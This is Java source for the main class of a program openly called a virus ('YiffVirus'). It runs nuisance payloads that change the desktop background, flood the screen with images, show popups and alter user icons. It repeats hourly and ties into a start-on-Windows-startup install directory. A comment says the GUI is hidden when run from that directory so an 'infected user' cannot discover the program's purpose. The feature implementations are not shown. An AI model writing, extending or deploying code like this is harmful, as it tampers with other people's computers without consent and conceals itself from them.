package me.bannock.virus;


import com.formdev.flatlaf.FlatDarculaLaf;
import com.google.gson.Gson;
import me.bannock.virus.features.Feature;
import me.bannock.virus.features.impl.FeatChangeBackground;
import me.bannock.virus.features.impl.FeatChangeUserIcons;
import me.bannock.virus.features.impl.FeatImageFlood;
import me.bannock.virus.features.impl.FeatPopupImages;
import me.bannock.virus.images.ImageProviderService;
import me.bannock.virus.images.impl.TestImageProviderService;
import me.bannock.virus.utils.MiscUtils;
import me.bannock.virus.utils.StartOnWindowsStartUtil;
import me.bannock.virus.utils.WindowsUtils;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
import java.awt.HeadlessException;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;

public class YiffVirus extends JFrame implements Runnable {

    static{
        FlatDarculaLaf.setup();
    }

    private Config config = new Config();
    private ImageProviderService imageProviderService = new TestImageProviderService();
    private final Feature[] features = new Feature[]{
            new FeatChangeBackground(),
            new FeatImageFlood(),
            new FeatPopupImages(),
            new FeatChangeUserIcons()
            // TODO: Set folder icons
    };

    protected static final File HEADLESS_CONFIG_FILE = new File(StartOnWindowsStartUtil.VIRUS_INSTALL_DIR, "msg.json");

    /**
     * Creates a new gui window
     * @throws HeadlessException Whenever it feels like it
     */
    public YiffVirus() throws HeadlessException {
        setSize(450, 450);
        setResizable(false);
        setDefaultCloseOperation(EXIT_ON_CLOSE);
        setTitle("Virus");
        setContentPane(new VirusSetupForm(config, this).getForm());
    }

    /**
     * Entry point for application
     * @param args
     */
    public static void main(String[] args) {
        YiffVirus yiffVirus = new YiffVirus();

        // Show the gui if the user wants a gui, autoload if the user configured it to autoload
        boolean showGui = true;
        for (String arg : args){
            if (arg.toLowerCase().equals("-headless")) {
                showGui = false;
                if (HEADLESS_CONFIG_FILE.exists()) {
                    try {
                        yiffVirus.setConfig(new Gson().fromJson(Files.readString(HEADLESS_CONFIG_FILE.toPath()), Config.class));
                    } catch (Exception ignored) {}
                }
                yiffVirus.run();
            }
        }

        // If the jar is loaded from the virus install dir then do not show the gui, this is done so an infected user cannot
        // find out the purpose of the jar just by double-clicking it and reading the window title
        if (new File("").getAbsolutePath().equals(StartOnWindowsStartUtil.VIRUS_INSTALL_DIR.getAbsolutePath()))
            showGui = false;

        // Display gui if wanted by user
        if (showGui)
            yiffVirus.setVisible(true);

    }

    /**
     * Starts running the virus, locks thread
     */
    @Override
    public void run() {
        // If the window is still visible then hide and dispose it
        if (isVisible()) {
            setVisible(false);
            dispose();
        }

        // Loop through and run every feature
        for (Feature feature : features){
            try{
                feature.setConfig(config).run();
            }catch (Exception ignored){}
        }

        // Repeated hourly if wanted
        if (config.shouldRunHourly()){
            final Runnable goober = this;
            new Timer().schedule(new TimerTask() {
                @Override
                public void run() {
                    goober.run();
                }
            }, 1000 * 60 * 60);
        }
    }

    public void setConfig(Config config) {
        this.config = config;
    }

}
